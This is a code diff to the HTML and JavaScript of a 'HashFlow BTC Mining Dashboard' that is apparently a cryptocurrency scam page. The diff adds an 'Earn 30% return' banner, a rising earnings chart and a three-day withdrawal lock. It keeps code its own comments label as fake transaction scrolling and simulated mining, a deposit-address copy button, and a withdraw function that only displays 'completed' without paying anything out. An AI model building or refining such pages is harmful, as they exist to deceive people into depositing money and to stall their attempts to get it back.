@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>HashFlow BTC Monitoring Dashboard</title>
+<title>HashFlow BTC Mining Dashboard</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <style>
 body{margin:0;padding:0;font-family:Arial,sans-serif;background:#0b0f1a;color:white;}
@@ -11,13 +11,15 @@ h2{color:#f2a900;text-align:center;}
 .btc{font-size:28px;text-align:center;margin:10px 0;}
 .stats{display:flex;justify-content:space-around;flex-wrap:wrap;}
 .stats div{background:#0b0f1a;padding:10px;margin:5px;border-radius:8px;}
-.tx-container{max-height:260px;overflow:hidden;background:#0b0f1a;padding:10px;border-radius:8px;font-size:13px;}
+.tx-container{max-height:260px;overflow:hidden;background:#0b0f1a;padding:10px;border-radius:8px;font-size:13px;position:relative;}
 .tx{display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid #222;}
 .green{color:#00ff99;}
 .yellow{color:#ffcc66;}
 .btc-box{background:#0b0f1a;padding:10px;border-radius:8px;word-break:break-all;text-align:center;}
-button{background:#f2a900;border:none;padding:10px 16px;border-radius:6px;font-weight:bold;cursor:pointer;margin-top:5px;}
-input{width:100%;padding:10px;margin-top:10px;border-radius:6px;border:none;font-size:14px;}
+button{background:#f2a900;border:none;padding:10px 16px;border-radius:6px;font-weight:bold;cursor:pointer;margin-top:5px;display:block;width:100%;}
+input{width:100%;padding:10px;margin-top:10px;border-radius:6px;border:none;font-size:14px;display:block;}
+.locked{opacity:0.7;cursor:not-allowed;}
+canvas{width:100%;height:140px;border-radius:8px;margin-top:10px;background:#0b0f1a;display:block;}
 </style>
 </head>
 <body>
@@ -35,7 +37,9 @@ input{width:100%;padding:10px;margin-top:10px;border-radius:6px;border:none;font
 <!-- Mining Dashboard -->
 <div class="card">
   <h2>Mining Dashboard</h2>
+  <p style="text-align:center;color:#f2a900;">Earn 30% return</p>
   <div class="btc" id="balance">0.00000000 BTC</div>
+  <canvas id="chart"></canvas>
   <div class="stats">
     <div>Hashrate: 120 TH/s</div>
     <div>Blocks: <span id="blocks">0</span></div>
@@ -46,9 +50,9 @@ input{width:100%;padding:10px;margin-top:10px;border-radius:6px;border:none;font
 <!-- Withdraw BTC -->
 <div class="card">
   <h2>Withdraw BTC</h2>
-  <p>Enter your BTC withdrawal address:</p>
-  <input id="withdrawAddress" placeholder="Enter BTC address">
-  <button onclick="withdrawBTC()">Withdraw</button>
+  <p id="withdrawInfo">Withdrawal available in <span id="countdown">3d 0h 0m 0s</span></p>
+  <input id="withdrawAddress" placeholder="Enter BTC address" disabled>
+  <button id="withdrawBtn" class="locked" onclick="withdrawBTC()" disabled>Withdraw</button>
   <p id="withdrawMessage" style="color:#f2a900;font-size:14px;"></p>
 </div>
 
@@ -59,13 +63,13 @@ input{width:100%;padding:10px;margin-top:10px;border-radius:6px;border:none;font
 </div>
 
 <script>
-// Copy BTC address
+// ===== BTC Deposit Copy =====
 function copyAddress(){
   navigator.clipboard.writeText(document.getElementById('btcAddress').innerText)
     .then(()=>{alert('BTC address copied!');});
 }
 
-// Mining Simulation
+// ===== Mining Simulation =====
 let balance = 0;
 let blocks = 0;
 let minutes = 0;
@@ -73,26 +77,31 @@ const txs = document.getElementById("txs");
 let rate = 0.00000008;
 let paused = false;
 
-// Fake transactions scrolling
-function addFakeTx(){
-  const div = document.createElement("div");
-  div.className="tx";
-  const val = (Math.random()*0.0004+0.00002).toFixed(8);
-  const status = Math.random()>0.5 ? "Completed":"Pending";
-  div.innerHTML = `<span>+${val} BTC</span><span class="${status==="Completed"?"green":"yellow"}">${status}</span>`;
-  txs.prepend(div);
-  if(txs.children.length>500) txs.removeChild(txs.lastChild);
+// ===== Smooth Chart Setup =====
+const canvas = document.getElementById("chart");
+const ctx = canvas.getContext("2d");
+let points = [0];
+
+function drawChart(){
+  ctx.clearRect(0,0,canvas.width,canvas.height);
+  const w = canvas.width/50;
+  ctx.beginPath();
+  let lastY = canvas.height - points[0]*canvas.height/0.01;
+  ctx.moveTo(0,lastY);
+  for(let i=1;i<points.length;i++){
+    let y = canvas.height - points[i]*canvas.height/0.01;
+    ctx.lineTo(i*w,y);
+  }
+  ctx.strokeStyle="#f2a900";
+  ctx.lineWidth=2;
+  ctx.stroke();
+  const last = points[points.length-1]||0;
+  points.push(last+rate);
+  if(points.length>50) points.shift();
 }
-setInterval(addFakeTx,1500);
+setInterval(drawChart,500);
 
-// Update BTC balance
-setInterval(()=>{
-  if(paused) return;
-  balance += rate;
-  document.getElementById("balance").innerText = balance.toFixed(8)+" BTC";
-},1000);
-
-// Update stats
+// ===== Update Mining Stats =====
 setInterval(()=>{
   blocks += Math.floor(Math.random()*2);
   minutes++;
@@ -100,19 +109,71 @@ setInterval(()=>{
   document.getElementById("uptime").innerText = Math.floor(minutes/60)+"h "+(minutes%60)+"m";
 },60000);
 
-// Withdraw function
-function withdrawBTC(){
-  const addr = document.getElementById("withdrawAddress").value.trim();
-  if(addr===""){alert("Enter BTC address"); return;}
-  document.getElementById("withdrawMessage").innerText = `Withdrawal to ${addr} processing...`;
-  setTimeout(()=>{document.getElementById("withdrawMessage").innerText = `Withdrawal to ${addr} completed!`; document.getElementById("withdrawAddress").value="";},3000);
+setInterval(()=>{
+  if(!paused){
+    balance+=rate;
+    document.getElementById("balance").innerText = balance.toFixed(8)+" BTC";
+  }
+},1000);
+
+// ===== Fake Recent Activity Scrolling =====
+function addFakeTx(){
+  const div = document.createElement("div");
+  div.className="tx";
+  const val = (Math.random()*0.0004+0.00002).toFixed(8);
+  const status = Math.random()>0.5?"Completed":"Pending";
+  div.innerHTML = `<span>+${val} BTC</span><span class="${status==="Completed"?"green":"yellow"}">${status}</span>`;
+  txs.prepend(div);
+  if(txs.children.length>500) txs.removeChild(txs.lastChild);
+}
+setInterval(addFakeTx,1500);
+
+// ===== Withdraw Function =====
+const withdrawBtn = document.getElementById("withdrawBtn");
+const withdrawInput = document.getElementById("withdrawAddress");
+const countdown = document.getElementById("countdown");
+const lockDuration = 3*24*60*60*1000; // 3 days in ms
+
+let startTime = localStorage.getItem("startMiningTime");
+if(!startTime){
+  startTime = Date.now();
+  localStorage.setItem("startMiningTime", startTime);
 }
 
-// 15-min pause simulation
+function updateCountdown(){
+  const now = Date.now();
+  const elapsed = now - startTime;
+  const remaining = lockDuration - elapsed;
+  if(remaining <=0){
+    withdrawBtn.disabled=false;
+    withdrawBtn.classList.remove("locked");
+    withdrawInput.disabled=false;
+    countdown.innerText = "Available now!";
+  } else {
+    const d = Math.floor(remaining/(1000*60*60*24));
+    const h = Math.floor((remaining%(1000*60*60*24))/(1000*60*60));
+    const m = Math.floor((remaining%(1000*60*60))/(1000*60));
+    const s = Math.floor((remaining%(1000*60))/1000);
+    countdown.innerText = `${d}d ${h}h ${m}m ${s}s`;
+  }
+}
+setInterval(updateCountdown,1000);
+updateCountdown();
+
+function withdrawBTC(){
+  const addr = withdrawInput.value.trim();
+  if(addr===""){alert("Enter BTC address"); return;}
+  document.getElementById("withdrawMessage").innerText = `Withdrawal to ${addr} processing...`;
+  setTimeout(()=>{
+    document.getElementById("withdrawMessage").innerText = `Withdrawal to ${addr} completed!`;
+    withdrawInput.value="";
+  },3000);
+}
+
+// ===== 15-min pause and 1-hour drop =====
 function startPauseCycle(){ setInterval(()=>{ paused=true; setTimeout(()=>{paused=false;},60000); },15*60*1000); }
 startPauseCycle();
 
-// 1-hour drop simulation
 function startHourlyDrop(){ setInterval(()=>{ balance*=0.995; },60*60*1000); }
 startHourlyDrop();
 </script>
